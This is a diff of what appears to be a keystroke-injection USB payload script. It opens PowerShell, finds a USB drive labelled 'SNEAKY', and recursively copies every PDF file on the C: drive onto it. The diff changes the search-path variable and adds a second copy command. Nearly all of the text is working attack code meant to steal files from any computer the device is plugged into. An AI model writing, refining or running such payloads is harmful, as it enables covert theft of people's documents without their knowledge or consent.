@@ -12,10 +12,10 @@ type("powershell\n"); 	// Opens powershell
 delay(1000);
 
 var FileTypes = ["*.pdf"] // The file extensions that will be exfiltrated
-var SearchPath = ["C:"]	       // The path to look for files NOTE: this will include ALL folders and sub-folders
+var SearchDrive = ["C:"] // The path to look for files NOTE: this will include ALL folders and sub-folders
 
-type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name\n"); // Find the drive named "SNEAKY" and save it's path
-type("Get-ChildItem " + SearchPath + " -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name}\n"); 
-// Searches and copies the files that meet the FileTypes variable and copy them to SNEAKY
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name\n"); 												// Find the drive named "SNEAKY" and save it's path
+type("Get-ChildItem C: -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name}\n"); 					// Searches and copies the files in '3D Objects', 'Downloads', 'Documents', ect.
+type("Get-ChildItem " + SearchDrive + "/ -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name}\n"); 	// Searches and copies the files in the SearchDrive
 
 type("exit\n");  		// Closes out 
